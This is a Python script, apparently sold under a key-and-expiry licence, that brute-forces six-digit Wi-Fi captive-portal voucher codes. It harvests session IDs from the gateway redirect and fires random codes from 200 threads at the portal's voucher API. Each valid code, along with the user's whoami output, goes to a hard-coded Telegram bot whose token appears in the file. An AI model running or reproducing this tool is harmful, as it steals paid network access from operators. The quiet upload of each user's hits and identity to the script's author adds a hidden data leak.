import requests, random, string, time, os, threading, re, sys, urllib3, subprocess
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from colorama import Fore, Back, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ TELEGRAM CONFIG ] ---
TG_TOKEN = "8128849629:AAFklO_HPBPBt4-ZyRhLnTDrG3A80JNdLdo"
TG_ID = "7164283260"
tg_queue = Queue()

# --- [ COLORS ] ---
G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS = Style.RESET_ALL
RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]

# ===============================
# CONFIGURATION
# ===============================
RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
else: DOWNLOAD_DIR = '/sdcard/Download'

LICENSE_FILE = os.path.join(DOWNLOAD_DIR, '.license.txt')
SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')

NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300 
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# GLOBALS
# ==============================
USER_NAME = "Unknown"
EXPIRY_STR = "N/A"
DAYS_LEFT = "0"
session_pool = Queue()
valid_hits_data = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
TOTAL_TRIED = 0
CURRENT_CODE = "WAITING"
START_TIME = time.time()
stop_event = threading.Event()

def get_hwid():
    try: return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except: return "ID-UNKNOWN"

# --- [ TELEGRAM WORKER ] ---
def telegram_worker():
    while not stop_event.is_set():
        try:
            data = tg_queue.get(timeout=5)
            msg = (f"🚀 **VOUCHER FOUND!**\n\n"
                   f"👤 **User:** `{USER_NAME}`\n"
                   f"🎟 **Code:** `{data['code']}`\n"
                   f"⏳ **Limit:** `{data['hrs']}`\n"
                   f"📱 **HWID:** `{get_hwid()}`\n"
                   f"⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
                          json={"chat_id": TG_ID, "text": msg, "parse_mode": "Markdown"}, timeout=10)
        except: time.sleep(5)

def Draw_logo(step=0):
    os.system('clear')
    clr = RAINBOW[step % len(RAINBOW)]
    print(f"""{clr}
      .---.        .-----------.
     /     \  __  /    v2.0     \\
    / /     \(  )/   TIME-BASED  \\
   //////   ' \/ `    LICENSED    \\
  //////    /    \   SCANNER      /
 //////    /      \              /
'------'  '--------'------------'
{W} OWNER : {C}{USER_NAME} {W}| EXP : {Y}{EXPIRY_STR} ({DAYS_LEFT} Days Left){RS}""")

# --- [ ENHANCED VERIFY SYSTEM WITH TIME CHECK ] ---
def verify():
    global USER_NAME, EXPIRY_STR, DAYS_LEFT
    hwid = get_hwid()
    now = datetime.now().date()
    
    # 1. Offline Check
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved = f.read().strip().split(":")
            if len(saved) >= 3:
                u_name, u_exp = saved[1], saved[2]
                exp_date = datetime.strptime(u_exp, '%Y-%m-%d').date()
                diff = (exp_date - now).days
                if diff >= 0:
                    USER_NAME, EXPIRY_STR, DAYS_LEFT = u_name, u_exp, str(diff)
                    return True
                else:
                    os.remove(LICENSE_FILE) # သက်တမ်းကုန်လျှင် ဖျက်ပစ်မည်
                    print(f"{R}[!] Your License has expired!{RS}")
        except: pass
    
    # 2. Online Check (Key Format -> Key:HWID:Name:YYYY-MM-DD)
    Draw_logo()
    try:
        print(f"{W}[*] Connecting to Server...{RS}")
        resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
        print(f"{W}[+] DEVICE ID: {Y}{hwid}{RS}")
        key = input(f"{Y}[?] ENTER KEY: {RS}").strip()
        
        for line in resp.splitlines():
            if ":" in line:
                parts = line.split(":")
                # Format: KEY:HWID:NAME:EXPIRY
                if len(parts) >= 4 and parts[0] == key and parts[1] == hwid:
                    u_name, u_exp = parts[2], parts[3]
                    exp_date = datetime.strptime(u_exp, '%Y-%m-%d').date()
                    diff = (exp_date - now).days
                    
                    if diff >= 0:
                        USER_NAME, EXPIRY_STR, DAYS_LEFT = u_name, u_exp, str(diff)
                        with open(LICENSE_FILE, "w") as f: f.write(f"{key}:{u_name}:{u_exp}")
                        print(f"{G}[+] Login Successful! {diff} days left.{RS}")
                        time.sleep(1.5)
                        return True
                    else:
                        print(f"{R}[!] This Key is expired ({u_exp}){RS}")
                        return False
        print(f"{R}[!] Invalid Key or HWID not matched!{RS}")
        return False
    except Exception as e:
        print(f"{R}[!] Server Error: {e}{RS}")
        return False

# --- [ CORE SCANNING LOGIC ] ---
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    try:
        r1 = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        if session_pool.qsize() < SESSION_POOL_SIZE:
            sid = get_sid_from_gateway()
            if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
        time.sleep(1)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            CURRENT_CODE = code
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1}, 
                                 timeout=6)
            TOTAL_TRIED += 1
            
            if "true" in r.text.lower():
                limit_label = "???"
                try:
                    res_data = r.json()
                    limit = res_data.get('limit') or res_data.get('timeLimit') or res_data.get('data', {}).get('timeLimit')
                    if limit:
                        sec = int(limit)
                        limit_label = "1 Month" if sec >= 2592000 else (f"{sec//86400} Day" if sec >= 86400 else f"{round(sec/3600, 1)} Hrs")
                except: pass

                hit_info = {"code": code, "hrs": limit_label}
                with valid_lock:
                    valid_hits_data.append(hit_info)
                    TOTAL_HITS += 1
                    tg_queue.put(hit_info)
                    with file_lock:
                        with open(SAVE_PATH, "a") as f:
                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

def live_dashboard():
    step = 0
    while not stop_event.is_set():
        Draw_logo(step)
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        print(W + "—" * 55)
        print(f"| {W}STATUS : {G}ACTIVE{RS}          {W}SPEED  : {C}{speed:.1f} codes/s")
        print(f"| {W}TRIED  : {W}{TOTAL_TRIED:,}        {W}HITS   : {G}{TOTAL_HITS}")
        print(f"| {W}TARGET : {Y}{CURRENT_CODE}           {W}TIME   : {Y}{datetime.now().strftime('%H:%M:%S')}")
        print(W + "—" * 55)
        if valid_hits_data:
            for hit in valid_hits_data[-5:]:
                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
        step += 1
        time.sleep(0.5)

if __name__ == "__main__":
    if verify(): 
        threading.Thread(target=telegram_worker, daemon=True).start()
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            sys.exit()
